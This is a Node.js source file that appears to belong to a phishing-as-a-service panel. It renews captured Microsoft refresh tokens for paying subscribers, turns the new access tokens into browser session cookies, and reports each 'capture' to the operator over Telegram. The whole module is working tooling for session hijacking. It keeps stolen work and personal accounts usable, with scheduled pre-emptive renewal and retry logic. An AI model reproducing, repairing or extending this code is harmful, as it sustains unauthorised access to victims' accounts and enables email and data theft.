const db = require('../database/connection');
const { decrypt, encrypt } = require('../utils/encrypt');
const { convertTokensToCookies } = require('./cookieconverter');
const axios = require('axios');
const ms = require('./microsoftclient');
const config = require('../config/env');

async function runRenewalCycle() {
  const windowHours = config.RENEWAL_WINDOW_HOURS;
  const maxAttempts = config.MAX_RENEWAL_ATTEMPTS;

  // Pre-emptive renewal: renew cookies that are about to expire (within 6 hours)
  const [expiringSoon] = await db.query(
    `SELECT ct.*, u.subscription_status, u.subscription_expiry, l.template_type, ct.account_type
     FROM captured_tokens ct
     JOIN users u ON ct.user_id = u.id
     LEFT JOIN links l ON ct.link_id = l.id
     WHERE ct.token_type = 'cookie'
       AND ct.deleted = 0
       AND ct.stale = 0
       AND ct.renewal_attempts < ?
       AND u.subscription_status = 'active'
       AND (u.subscription_expiry IS NULL OR u.subscription_expiry > NOW())
       AND ct.expiration IS NOT NULL
       AND ct.expiration < DATE_ADD(NOW(), INTERVAL 6 HOUR)`,
    [maxAttempts]
  );

  for (const capture of expiringSoon) {
    await renewSingleCapture(capture, true); // true = pre-emptive
  }

  // Regular renewal: cookies that have expired or are in renewal window
  const [expired] = await db.query(
    `SELECT ct.*, u.subscription_status, u.subscription_expiry, l.template_type, ct.account_type
     FROM captured_tokens ct
     JOIN users u ON ct.user_id = u.id
     LEFT JOIN links l ON ct.link_id = l.id
     WHERE ct.token_type = 'cookie'
       AND ct.deleted = 0
       AND ct.stale = 0
       AND ct.renewal_attempts < ?
       AND u.subscription_status = 'active'
       AND (u.subscription_expiry IS NULL OR u.subscription_expiry > NOW())
       AND (ct.expiration IS NULL OR ct.expiration <= NOW())`,
    [maxAttempts]
  );

  for (const capture of expired) {
    await renewSingleCapture(capture, false); // false = expired
  }
}

async function renewSingleCapture(capture, isPreemptive = false) {
  try {
    const refreshToken = decrypt(capture.refresh_token_encrypted);
    if (!refreshToken) {
      await markStale(capture.id, 'No refresh token available');
      return { success: false, error: 'No refresh token' };
    }

    // Exponential backoff: wait longer if we've had recent failures
    const attemptDelay = Math.min(Math.pow(2, capture.renewal_attempts || 0) * 1000, 30000);
    if (attemptDelay > 0 && !isPreemptive) {
      await sleep(attemptDelay);
    }

    // Detect account type for proper endpoint/scope selection
    let accountType = capture.account_type || 'work_school';
    if (accountType === 'unknown') accountType = 'work_school';
    const isPersonal = accountType === 'personal';

    // Use stored tenant from capture row (set at capture time)
    let tenant = capture.tenant || 'common';
    
// For personal accounts, use consumers endpoint exclusively
if (isPersonal) {
  tenant = 'consumers';
} else if (tenant === 'common') {
  // Try to get tenant from link jwt_payload for work accounts - with strict validation
  if (capture.link_id) {
    try {
      const [links] = await db.query('SELECT jwt_payload FROM links WHERE id = ?', [capture.link_id]);
      if (links.length && links[0].jwt_payload) {
        try {
          const parsed = JSON.parse(links[0].jwt_payload);
          // SECURITY VALIDATION: Only allow trusted/known tenant values
          // Prevents cross-tenant data leakage via manipulated jwt_payload
          const allowedTenants = ['common', 'organizations', 'adfs']; // Safe default Microsoft tenants
          if (parsed.tenant && allowedTenants.includes(parsed.tenant)) {
            tenant = parsed.tenant;
          } else if (parsed.tenant && /^[a-fA-F0-9\-]{36}$/.test(parsed.tenant)) {
            // Allow valid GUID tenant IDs (organization-specific tenant)
            tenant = parsed.tenant;
          }
          // If tenant is not in allowed list, keep it as 'common' and log warning
          if (!parsed.tenant || !(allowedTenants.includes(parsed.tenant) || /^[a-fA-F0-9\-]{36}$/.test(parsed.tenant))) {
            console.warn(`[SessionKeeper] Invalid tenant value in JWT payload: ${parsed.tenant}`, { link_id: capture.link_id });
          }
        } catch (e) {
          console.error('[SessionKeeper] Failed to parse JWT payload', e.message);
        }
      }
    } catch (e) {
      console.error('[SessionKeeper] Error fetching link data', e.message);
    }
  }
}

    // Build correct scope per account type
    const scope = isPersonal 
      ? 'openid profile email offline_access' 
      : 'https://graph.microsoft.com/.default offline_access openid profile';

    // Call Microsoft token endpoint with refresh token using correct account-specific settings
    const response = await ms.post(
      `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
      new URLSearchParams({
        grant_type: 'refresh_token',
        refresh_token: refreshToken,
        client_id: config.AZURE_CLIENT_ID,
        scope: scope,
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 30000 }
    );

    const newAccessToken = response.data.access_token;
    const newRefreshToken = response.data.refresh_token || refreshToken;

    // Check for soft errors (AADSTS50076 - interaction required)
    const errorCode = response.data.error_code || response.data.error;
    if (errorCode === '50076' || errorCode === 'interaction_required' || response.data.error === 'interaction_required') {
      await handleSoftError(capture, newAccessToken, newRefreshToken);
      return { success: false, error: 'Soft error - switched to device code flow', soft_error: true };
    }

    // Convert to cookies with account-type awareness
    const cookieResult = await convertTokensToCookies(
      newAccessToken,
      capture.template_type || 'office',
      tenant,
      capture.email,
      accountType
    );

  if (cookieResult.success && cookieResult.cookies) {
    // Set cookie TTL based on token expiration or configurable maximum
    const expiresIn = response.data.expires_in || 7776000; // Default 90 days in seconds
    const config = require('../config/env');
    const maxTTL = config.COOKIE_MAX_TTL_HOURS || 720; // Default 30 days max
    const ttlHours = Math.min(Math.max(expiresIn / 3600, 24), maxTTL); // Min 24h, Max configurable

      await db.query(
        `UPDATE captured_tokens
         SET access_token_encrypted = ?, refresh_token_encrypted = ?,
             cookies_encrypted = ?, expiration = DATE_ADD(NOW(), INTERVAL ? HOUR),
             last_renewed = NOW(), renewal_count = renewal_count + 1,
             account_type = ?, stale = 0
         WHERE id = ?`,
        [
          encrypt(newAccessToken),
          encrypt(newRefreshToken),
          encrypt(cookieResult.cookies),
          ttlHours,
          accountType,
          capture.id
        ]
      );

      // Log renewal
      await db.query(
        'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, renewal_type) VALUES (?, ?, 1, ?, ?)',
        [capture.id, capture.user_id, '127.0.0.1', isPreemptive ? 'preemptive' : 'regular']
      );

      // Notify user via Telegram
      const message = isPreemptive
        ? `⚡ Pre-emptive renewal for capture #${capture.id}`
        : `🔄 Cookies renewed for capture #${capture.id}`;
      await notifyUser(capture.user_id, message);

      return { success: true, cookies: cookieResult.cookies, account_type: accountType };
    } else {
      await handleRenewalFailure(capture, cookieResult.error);
      return { success: false, error: cookieResult.error };
    }
  } catch (err) {
    console.error('[SessionKeeper] Renewal error:', err.message);
    await handleRenewalFailure(capture, err.message);
    return { success: false, error: err.message };
  }
}

async function handleSoftError(capture, accessToken, refreshToken) {
  try {
    await db.query(
      `UPDATE captured_tokens
       SET access_token_encrypted = ?, refresh_token_encrypted = ?,
           renewal_attempts = renewal_attempts + 1,
           last_renewed = NOW()
       WHERE id = ?`,
      [encrypt(accessToken), encrypt(refreshToken), capture.id]
    );

    await db.query(
      'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, error_message, renewal_type) VALUES (?, ?, 0, ?, ?, ?)',
      [capture.id, capture.user_id, '127.0.0.1', 'Soft error: AADSTS50076 - re-authentication required', 'soft_error']
    );

    await notifyUser(capture.user_id, `⚠️ Re-authentication required for capture #${capture.id}. Please log in again.`);
  } catch (err) {
    console.error('Error handling soft error:', err);
  }
}

async function handleRenewalFailure(capture, errorMessage = 'Renewal failed') {
  const newAttempts = (capture.renewal_attempts || 0) + 1;
  const maxAttempts = config.MAX_RENEWAL_ATTEMPTS;

  if (newAttempts >= maxAttempts) {
    await db.query('UPDATE captured_tokens SET stale = 1, renewal_attempts = ? WHERE id = ?', [newAttempts, capture.id]);
    await notifyUser(capture.user_id, `⚠️ Cookie renewal failed permanently for capture #${capture.id}. Marked as stale.\nError: ${errorMessage}`);
  } else {
    await db.query('UPDATE captured_tokens SET renewal_attempts = ? WHERE id = ?', [newAttempts, capture.id]);
  }

  await db.query(
    'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, error_message, renewal_type) VALUES (?, ?, 0, ?, ?, ?)',
    [capture.id, capture.user_id, '127.0.0.1', `${errorMessage} (attempt ${newAttempts}/${maxAttempts})`, 'renewal_failed']
  );
}

async function markStale(captureId) {
  await db.query('UPDATE captured_tokens SET stale = 1 WHERE id = ?', [captureId]);
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function notifyUser(userId, message) {
  try {
    const [users] = await db.query('SELECT * FROM users WHERE id = ?', [userId]);
    if (!users.length) return;

    const user = users[0];

    // Telegram notification
    if (user.notify_prt && user.telegram_id && user.telegram_bot_token) {
      try {
        await axios.post(`https://api.telegram.org/bot${user.telegram_bot_token}/sendMessage`, {
          chat_id: user.telegram_id,
          text: message,
          parse_mode: 'HTML',
        });
      } catch (e) {
        console.error('Telegram notification failed:', e.message);
      }
    }

    // Email notification (if SMTP is configured)
    if (user.notify_login && user.email) {
      try {
        console.log(`Email notification for user ${userId}: ${message}`);
      } catch (e) {
        console.error('Email notification failed:', e.message);
      }
    }
  } catch (e) {
    console.error('Notification error:', e);
  }
}

// Get renewal statistics for a user
async function getRenewalStats(userId, captureId = null) {
  try {
    let query = `
      SELECT
        COUNT(*) as total_renewals,
        SUM(CASE WHEN success = 1 THEN 1 ELSE 0 END) as successful_renewals,
        SUM(CASE WHEN success = 0 THEN 1 ELSE 0 END) as failed_renewals,
        MAX(created_at) as last_renewal_attempt
      FROM cookie_renewals
      WHERE user_id = ?`;
    const params = [userId];

    if (captureId) {
      query += ' AND capture_id = ?';
      params.push(captureId);
    }

    query += '';

    const [stats] = await db.query(query, params);
    return stats[0] || {};
  } catch (err) {
    console.error('Error getting renewal stats:', err);
    return {};
  }
}

module.exports = {
  runRenewalCycle,
  renewSingleCapture,
  getRenewalStats
};
